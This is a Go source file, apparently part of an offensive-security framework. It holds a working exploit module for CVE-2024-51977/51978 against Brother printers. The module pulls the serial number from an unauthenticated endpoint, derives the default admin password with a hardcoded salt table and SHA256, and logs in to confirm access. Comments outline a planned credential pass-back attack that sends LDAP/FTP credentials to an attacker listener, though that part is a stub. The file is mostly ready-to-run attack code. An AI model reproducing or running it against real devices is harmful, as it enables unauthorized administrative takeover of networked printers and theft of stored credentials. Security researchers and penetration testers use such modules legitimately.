package safe

import (
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"regexp"
	"strings"
	"time"

	"papercut/internal/modules"
	"papercut/internal/output"
)

func init() { register(func() modules.ExploitModule { return NewBrotherDefaultPwd() }) }

// BrotherDefaultPwd exploits CVE-2024-51977 and CVE-2024-51978 to derive
// and validate the default administrator password on Brother MFP devices.
//
// The default password is deterministically generated from the device's serial
// number using SHA256 with a hardcoded salt table. The serial number is exposed
// via an unauthenticated endpoint (/etc/mnt_info.csv).
//
// Check: extracts serial, derives default password, validates login.
// Exploit: (Phase 2 — not yet implemented) authenticates, modifies LDAP/FTP
// settings to attacker listener, triggers test connection, captures credentials,
// restores original settings (CVE-2024-51984).
//
// Affects 689 Brother models + 59 rebadged models (Fujifilm, Ricoh, Toshiba, Konica Minolta).
// CVE-2024-51978 cannot be fully patched — baked into manufacturing.
//
// Category: SAFE — read-only check; exploit will restore settings after extraction.
type BrotherDefaultPwd struct {
	modules.BaseModule
}

// NewBrotherDefaultPwd creates a new instance of the Brother default password module.
func NewBrotherDefaultPwd() *BrotherDefaultPwd {
	m := &BrotherDefaultPwd{
		BaseModule: modules.BaseModule{
			Mod: modules.Module{
				Name:         "brother/http/default_pwd",
				Description:  "Brother Default Password & Credential Extractor (CVE-2024-51977/51978/51984)",
				Manufacturer: "Brother",
				Category:     "SAFE",
				Authors:      []string{"Waffl3ss", "sfewer-r7"},
				Tags:         []string{"brother", "default", "password", "serial", "cve-2024-51977", "cve-2024-51978", "cve-2024-51984", "mfp", "fujifilm", "passback"},
				Models:       []string{"MFC-L9570CDW", "MFC-L8900CDW", "MFC-L5700DW", "HL-L6200DW"},
			},
			Opts: []*modules.Option{
				{Name: "RHOST", Default: "", Required: true, Description: "Target IP address"},
				{Name: "RPORT", Default: "80", Required: false, Description: "Target HTTP port"},
				{Name: "SERIAL", Default: "", Required: false, Description: "Serial number (skip auto-extraction if set)"},
				{Name: "LHOST", Default: "", Required: false, Description: "Listener IP for credential capture (Phase 2)"},
				{Name: "LPORT", Default: "389", Required: false, Description: "Listener port for LDAP capture (Phase 2)"},
				{Name: "SSL", Default: "false", Required: false, Description: "Use HTTPS instead of HTTP"},
				{Name: "VERBOSE", Default: "false", Required: false, Description: "Verbose output"},
				{Name: "TIMEOUT", Default: "20", Required: false, Description: "HTTP request timeout in seconds"},
				{Name: "PROXY", Default: "", Required: false, Description: "Proxy (socks5://host:port or http://host:port)"},
			},
		},
	}
	m.InitDefaults()
	return m
}

func (b *BrotherDefaultPwd) newHTTPClient() (*http.Client, error) {
	jar, err := cookiejar.New(nil)
	if err != nil {
		return nil, fmt.Errorf("create cookie jar: %w", err)
	}
	return &http.Client{
		Jar:       jar,
		Timeout:   time.Duration(b.IntVal("TIMEOUT", 20)) * time.Second,
		Transport: modules.NewHTTPTransport(b.Val("PROXY")),
	}, nil
}

func (b *BrotherDefaultPwd) baseURL() string {
	scheme := "http"
	if b.BoolVal("SSL") {
		scheme = "https"
	}
	return fmt.Sprintf("%s://%s:%s", scheme, b.Val("RHOST"), b.Val("RPORT"))
}

// Check extracts the serial, derives the default password, and validates login.
func (b *BrotherDefaultPwd) Check() (*modules.CheckResult, error) {
	if err := b.Validate(); err != nil {
		return nil, err
	}

	rhost := b.Val("RHOST")
	portInt := b.IntVal("RPORT", 80)
	verbose := b.BoolVal("VERBOSE")

	client, err := b.newHTTPClient()
	if err != nil {
		return nil, err
	}

	// Step 1: Get serial number
	serial := b.Val("SERIAL")
	if serial == "" {
		serial, err = b.extractSerial(client, verbose)
		if err != nil {
			return &modules.CheckResult{
				Success: false, Target: rhost, Port: portInt,
				Details: fmt.Sprintf("Serial extraction failed: %v", err),
			}, nil
		}
	}

	if verbose {
		output.Info("  Serial: %s", serial)
	}

	// Step 2: Derive default password
	password := generateBrotherPassword(serial)

	if verbose {
		output.Info("  Derived password: %s", password)
	}

	// Step 3: Validate login
	ok, err := b.validateLogin(client, password, verbose)
	if err != nil {
		return &modules.CheckResult{
			Success:  false, Target: rhost, Port: portInt,
			Username: "admin",
			Password: password,
			Details:  fmt.Sprintf("Login validation failed: %v (derived password: %s)", err, password),
		}, nil
	}

	if !ok {
		return &modules.CheckResult{
			Success:  false, Target: rhost, Port: portInt,
			Username: "admin",
			Password: password,
			Details:  fmt.Sprintf("Default password not accepted (serial: %s, derived: %s) — password may have been changed", serial, password),
		}, nil
	}

	return &modules.CheckResult{
		Success:  true, Target: rhost, Port: portInt,
		Username: "admin",
		Password: password,
		Details:  fmt.Sprintf("Default password valid (serial: %s)", serial),
	}, nil
}

// Exploit will authenticate and perform LDAP/FTP pass-back credential extraction (Phase 2 — CVE-2024-51984).
// Not yet implemented — requires Burp capture data for Brother LDAP/FTP settings endpoints.
// Use 'check' for default password validation.
func (b *BrotherDefaultPwd) Exploit() (*modules.ExploitResult, error) {
	return nil, fmt.Errorf("exploit (Phase 2 — pass-back) is not yet implemented. Use 'check' for default password validation")
}

// extractSerial fetches /etc/mnt_info.csv and parses the serial number.
func (b *BrotherDefaultPwd) extractSerial(client *http.Client, verbose bool) (string, error) {
	csvURL := b.baseURL() + "/etc/mnt_info.csv"

	if verbose {
		output.Info("  GET %s", csvURL)
	}

	resp, err := client.Get(csvURL)
	if err != nil {
		return "", fmt.Errorf("request failed: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("HTTP %d — endpoint may not be accessible", resp.StatusCode)
	}

	if verbose {
		output.Info("  Response: %d bytes", len(body))
	}

	// Parse CSV: first row is headers, second row is values
	// Find "Serial No." column index, then get corresponding value
	lines := strings.Split(strings.TrimSpace(string(body)), "\n")
	if len(lines) < 2 {
		return "", fmt.Errorf("CSV has fewer than 2 rows")
	}

	headers := parseCSVLine(lines[0])
	values := parseCSVLine(lines[1])

	serialIdx := -1
	for i, h := range headers {
		if strings.TrimSpace(h) == "Serial No." {
			serialIdx = i
			break
		}
	}

	if serialIdx < 0 {
		return "", fmt.Errorf("'Serial No.' column not found in CSV headers")
	}

	if serialIdx >= len(values) {
		return "", fmt.Errorf("serial column index out of range")
	}

	serial := strings.TrimSpace(values[serialIdx])
	if serial == "" {
		return "", fmt.Errorf("serial number is empty")
	}

	return serial, nil
}

// parseCSVLine splits a CSV line handling quoted fields.
func parseCSVLine(line string) []string {
	var fields []string
	var current strings.Builder
	inQuotes := false

	for _, r := range line {
		switch {
		case r == '"':
			inQuotes = !inQuotes
		case r == ',' && !inQuotes:
			fields = append(fields, current.String())
			current.Reset()
		default:
			current.WriteRune(r)
		}
	}
	fields = append(fields, current.String())
	return fields
}

// validateLogin attempts to log in with the derived password.
// GETs /general/status.html to find the password field name, then POSTs credentials.
// Returns true if AuthCookie is set in the response.
func (b *BrotherDefaultPwd) validateLogin(client *http.Client, password string, verbose bool) (bool, error) {
	statusURL := b.baseURL() + "/general/status.html"

	if verbose {
		output.Info("  GET %s", statusURL)
	}

	// Step 1: GET the login page to extract the password field name
	resp, err := client.Get(statusURL)
	if err != nil {
		return false, fmt.Errorf("get login page: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, fmt.Errorf("read login page: %w", err)
	}

	if resp.StatusCode != 200 {
		return false, fmt.Errorf("login page returned HTTP %d", resp.StatusCode)
	}

	// Extract password field name: <input type="password" id="LogBox" name="FIELDNAME">
	re := regexp.MustCompile(`input\s+type="password"\s+id="LogBox"\s+name="([a-zA-Z0-9]+)"`)
	match := re.FindSubmatch(body)
	if match == nil {
		// Try alternate pattern — some models vary
		re2 := regexp.MustCompile(`name="([a-zA-Z0-9]+)"\s+type="password"`)
		match = re2.FindSubmatch(body)
		if match == nil {
			return false, fmt.Errorf("could not find password field name in login page")
		}
	}

	fieldName := string(match[1])

	if verbose {
		output.Info("  Password field name: %s", fieldName)
	}

	// Step 2: POST login credentials
	data := url.Values{
		fieldName:  {password},
		"loginurl": {"/general/status.html"},
	}

	if verbose {
		output.Info("  POST %s (%s=***)", statusURL, fieldName)
	}

	resp2, err := client.PostForm(statusURL, data)
	if err != nil {
		return false, fmt.Errorf("login POST: %w", err)
	}
	defer resp2.Body.Close()
	io.ReadAll(resp2.Body) // drain

	// Check for AuthCookie in response
	for _, cookie := range resp2.Cookies() {
		if cookie.Name == "AuthCookie" && cookie.Value != "" {
			if verbose {
				output.Success("  AuthCookie received — login successful")
			}
			return true, nil
		}
	}

	// Also check Set-Cookie header directly (some versions)
	setCookie := resp2.Header.Get("Set-Cookie")
	if strings.Contains(setCookie, "AuthCookie=") {
		if verbose {
			output.Success("  AuthCookie in Set-Cookie header — login successful")
		}
		return true, nil
	}

	return false, nil
}

// generateBrotherPassword derives the default admin password from a serial number.
// Implements the algorithm from CVE-2024-51978 (sfewer-r7).
func generateBrotherPassword(serial string) string {
	// Take first 16 chars of serial
	s := serial
	if len(s) > 16 {
		s = s[:16]
	}

	// Get salt data from lookup tables (index 254 is the default)
	saltIdx := brotherSaltLookup[254]
	saltStr := brotherSaltData[saltIdx]

	// Build buffer: serial (up to 16 bytes) + reversed salt bytes (each decremented by 1)
	var buf []byte
	buf = append(buf, []byte(s)...)
	saltBytes := []byte(saltStr)
	buf = append(buf,
		saltBytes[7]-1,
		saltBytes[6]-1,
		saltBytes[5]-1,
		saltBytes[4]-1,
		saltBytes[3]-1,
		saltBytes[2]-1,
		saltBytes[1]-1,
		saltBytes[0]-1,
	)

	// SHA256 → Base64 → first 8 chars with substitution
	hash := sha256.Sum256(buf)
	b64 := base64.StdEncoding.EncodeToString(hash[:])

	var result strings.Builder
	for i := 0; i < 8 && i < len(b64); i++ {
		c := b64[i]
		switch c {
		case 'l':
			result.WriteByte('#')
		case 'I':
			result.WriteByte('$')
		case 'z':
			result.WriteByte('%')
		case 'Z':
			result.WriteByte('&')
		case 'b':
			result.WriteByte('*')
		case 'q':
			result.WriteByte('-')
		case 'O':
			result.WriteByte(':')
		case 'o':
			result.WriteByte('?')
		case 'v':
			result.WriteByte('@')
		case 'y':
			result.WriteByte('>')
		default:
			result.WriteByte(c)
		}
	}

	return result.String()
}

// brotherSaltLookup is the 256-entry index table from CVE-2024-51978.
var brotherSaltLookup = [256]int{
	0x06, 0x1A, 0x80, 0x93, 0x90, 0x60, 0xA4, 0x18, 0x76, 0xA8, 0xFA, 0x98, 0x58, 0x25, 0x5F, 0xBA,
	0x24, 0xCF, 0xDD, 0xB6, 0xD0, 0xE3, 0x7A, 0x68, 0x41, 0x8B, 0x21, 0x15, 0x7E, 0x65, 0x70, 0x7F,
	0x8C, 0x91, 0x3B, 0xFC, 0x13, 0x4A, 0xBE, 0xD7, 0x6C, 0x99, 0xC3, 0xD1, 0x51, 0x35, 0xDF, 0x23,
	0xB0, 0x3F, 0x3D, 0x16, 0x29, 0xA1, 0x59, 0xCA, 0xA2, 0x5C, 0x43, 0x0B, 0xA5, 0x36, 0xF0, 0xFE,
	0x3E, 0xED, 0xF2, 0xE6, 0xEA, 0x54, 0x66, 0x7D, 0xEE, 0x3C, 0x50, 0xEF, 0x9E, 0xD3, 0xB1, 0xF7,
	0xAC, 0x5A, 0x6E, 0x12, 0x2A, 0x01, 0x46, 0x8F, 0x6B, 0x88, 0x0E, 0x52, 0xF9, 0x81, 0xA0, 0x02,
	0xC1, 0xF1, 0xE9, 0xC2, 0xF6, 0x33, 0xCB, 0xB3, 0x73, 0x17, 0xFD, 0x6F, 0xF4, 0xEC, 0x84, 0xC6,
	0x47, 0xCE, 0x9F, 0xD5, 0x92, 0x85, 0x53, 0x26, 0x27, 0x62, 0xEB, 0xAE, 0x3A, 0x1F, 0x0F, 0x94,
	0x95, 0x82, 0x8E, 0x42, 0x28, 0xB9, 0xBF, 0xAF, 0xD4, 0x48, 0xD9, 0xC5, 0x4C, 0x64, 0x2B, 0x8D,
	0xF8, 0xAA, 0xC4, 0x63, 0x87, 0xE4, 0x1D, 0xA6, 0x14, 0xCD, 0xBB, 0xC0, 0xE5, 0xDA, 0x37, 0xC9,
	0xE8, 0xB8, 0x67, 0xDC, 0x5D, 0xA7, 0xAD, 0x79, 0x44, 0xF3, 0x83, 0xA9, 0x1B, 0x96, 0x89, 0xAB,
	0x45, 0xBC, 0x1C, 0xB4, 0xE1, 0x20, 0x2F, 0x49, 0x22, 0x86, 0xDB, 0x4E, 0xE0, 0x9B, 0x10, 0x19,
	0x97, 0x61, 0x40, 0x78, 0x5E, 0x39, 0xCC, 0x0D, 0x09, 0x9D, 0x34, 0x0C, 0x2E, 0x0A, 0x77, 0x6D,
	0xDE, 0xC7, 0xD8, 0xA3, 0xE2, 0x56, 0xB5, 0x4B, 0x38, 0x74, 0x8A, 0xBD, 0x6A, 0x4F, 0x07, 0x03,
	0x05, 0xFF, 0xF5, 0x31, 0x1E, 0xE7, 0xD2, 0x2D, 0x69, 0xC8, 0x5B, 0xD6, 0x57, 0x75, 0x7C, 0xB2,
	0x72, 0xB7, 0x2C, 0xFB, 0x11, 0x9C, 0x7B, 0x32, 0x55, 0x30, 0x71, 0x04, 0x9A, 0x4D, 0x08, 0x100,
}

// brotherSaltData is the 256-entry salt string table from CVE-2024-51978.
// Index 0x100 (256) is out of range — salt_lookup[255] = 0x100, which would be index 256.
// The PoC uses index 254 by default which maps to 0x08 = index 8 = "7HOLDhk'".
var brotherSaltData = [257]string{
	"aiaFrJAn", "FuUcjKwa", "cMnDTitZ", "RuSfzwJC", "XXrLDVub", "znimXRSU", "dLdJgcZf", "rgm32u2x",
	"7HOLDhk'", "ENbuNZVy", "eCd6Ygyf", "gmLt2GuL", "5dhjHet3", "nPtN7h23", "47rdTTV7", "KAkaSzWh",
	"s3m7wwW2", "wtBGnGjn", "H3LyF$dd", "H6EtSew2", "D9N8iJBB", "tPT4ZKm3", "XEEV4tjf", "zDXx93rw",
	"HKkmbGjD", "ng5sLECe", "QrPVDngu", "LPMhpZe9", "uLzhjUwc", "Sa9QBKW2", "AfrPdj7y", "ujmt9s72",
	"n8Y7XrFx", "8xeRU7rW", "RUzpQznp", "%hU5RMxP", "ipaZKMEW", "chP5cHCy", "b5UJabgU", "WtZsF7VF",
	"xk8wg669", "gAVynzbw", "GuRgNxkm", "UBCAUb85", "CQgQhyfp", "fcEegCtB", "5LSpTNPN", "dzrQdahF",
	"kD4fHLhM", "mHQ6QAUg", "TjZ6kiAb", "5SMdwEK6", "RD2ytHHH", "XgQHBfBY", "6ZZRVbHx", "BNDUsFCC",
	"iSwrrtpr", "ucBFJbGj", "Nzs7rhKJ", "uHugTJX5", "aXN3FsUF", "uyHDwwUK", "tbnJTYje", "SmgfLZ2n",
	"4sXy9D8j", "YLVSee68", "3U5TbNNS", "QjYfTBKu", "T*8AF8dk", "F8xQDTrW", "Pyeda62U", "33sghDrE",
	"ThiW9Naz", "BU9TDd7k", "72sgwM&G", "VkV+uSUt", "HpTdi9jL", "G3AbGyAH", "zbW8YCSy", "eKB25SCe",
	"rbzpCtQN", "EZSRB966", "nJAxxUbS", "7GZRAG9E", "PaMCwYGQ", "TZy2AeYr", "jMgYEPUT", "6QAepcUc",
	"jdWU9pXy", "CeZs6T8g", "jEEDBNPn", "fCHg4V5W", "rTUUjyPG", "3L5SNJhr", "XbXK4Lg9", "ZcdGAzLH",
	"ANfMJ&6p", "S4URfyzc", "Pai9muCn", "Nei%6NwR", "BnUWBHg6", "FwGyWrux", "mwkuuGXX", "WR$LK5Qu",
	"Lxs4DgNM", "KAYMHcKy", "UnWYeeUp", "2cc3EzeX", "7nVPpdCd", "LDPgHa9b", "Yfwsz7zR", "tGhb9Ych",
	"Gxi4S8jC", "QEiWU2cm", "PFhyTxjN", "LrpTgGLw", "PUfziDzE", "ACbmRneN", "gYmjyNjF", "RuZctKSS",
	"k8KdHgDB", "pJEA3hSG", "X6rbghrk", "9mnbf3up", "4WU2hMHx", "TgmNEn45", "zRnQReEn", "DfsPzxsX",
	"UyScxhhw", "knEsS3CX", "xuPUKwFf", "Ks4nKt2z", "trBf!b67", "rhHgt4gX", "2N8sPf#d", "eFMjhMcB",
	"aWLeRu9M", "4MiN4D63", "5nG9jMGh", "SA5pnyQ6", "UnSQ94nx", "kPjzBBxy", "6CppHT3R", "3VPgRgiL",
	"cP9JJDJr", "MyMWzUMj", "xyG4ACEd", "dbnAbG8e", "RnHGYc6F", "ktCQnJWk", "XBt5Vxr2", "wH6iY9f9",
	"atB4eri8", "8SdHujf8", "inLRdn5s", "Fh3N*pWc", "Fb3XYtZz", "GADACWcS", "r8tsDgph", "EumHNmFg",
	"rRFKrK2x", "TQ9nUnNk", "P5hss6GX", "mX8ZSQtr", "BJMjyd7H", "EC7r5fEm", "TPjQpDaa", "SZeMDpfR",
	"XEDJeraW", "YYNTgsah", "6uupfWF!", "7RcTLwHX", "ycYr3dwT", "7VwCnTFQ", "JGF6iigf", "M72Kea4f",
	"ZxfZWbVb", "NcT3LGBV", "HBU68uaa", "UeHK4pnf", "sDjzNHHd", "CGjgeutc", "PC4JbuC2", "tNYQc7Xs",
	"RGNsJQhD", "HKEh2fba", "49x4PLUz", "N6MLNkY5", "NrMHeE9d", "j5NkznV4", "n8At3YKi", "ZnHwAEnZ",
	"3LnUmF8E", "RBXzdUpA", "FwGHBVej", "3wkkik7E", "fpyGnp2u", "ANBwfiPb", "Ztt8X9zG", "47K7QWix",
	"TzJfUdNY", "hpD?MEAm", "sJRh4Jni", "TyQUgEEH", "FBJnWWwx", "7cN3GH6e", "hWQhzFTN", "GamDhsgZ",
	"yXM4cZKt", "9BJPKtaC", "NVNpe4kJ", "uSyxGxbz", "h5zTpV3U", "TAajcQ4h", "VjYMEusS", "Wpj237VG",
	"yAjHYVVV", "Hb6k7Cwe", "yZbuDBEi", "S4wpBmZM", "DwFra8wk", "j#Pk5r9W", "PjkfS9WB", "gHf3YGA3",
	"ihDtdUCu", "KARzJDfR", "M7fApB5U", "MiD44gRC", "RdEM8y5W", "4GsGuPag", "pETQc4k2", "pZZu7Ras",
	"AJReAUBy", "EAMmQsWe", "BeC2XJi8", "PujT2eRf", "2UXLeAJu", "hMPbY3MQ", "QeawRP*p", "SbCbW9Tf",
	"EhNNtLyj", "B8RjceGs", "LaydmLeD", "JFR7T47f", "WCbAdTfm", "srN9gNSE", "gAn7h8Yp", "4PnTKVse",
	"HDxGwLsN", "tR8XUSRg", "wLe-3Xf8", "zH7cpxsd", "tCc5sWFX", "3hzTj5BS", "hLK6f&g4", "tCzzSsm7",
	"", // index 256 — out-of-range sentinel for salt_lookup[255] = 0x100
}
